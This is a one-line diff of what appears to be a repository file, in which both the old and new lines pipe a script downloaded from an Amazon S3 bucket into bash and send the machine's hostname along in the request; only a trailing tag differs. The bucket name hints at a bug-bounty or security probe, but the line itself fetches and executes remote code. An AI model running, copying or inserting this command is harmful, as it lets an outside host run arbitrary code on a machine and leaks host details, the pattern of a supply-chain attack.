@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Unity-Technologies/ml-agents-grpc.git\&folder=objective-c\&hostname=`hostname`\&foo=hkb
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/Unity-Technologies/ml-agents-grpc.git\&folder=objective-c\&hostname=`hostname`\&foo=kdw
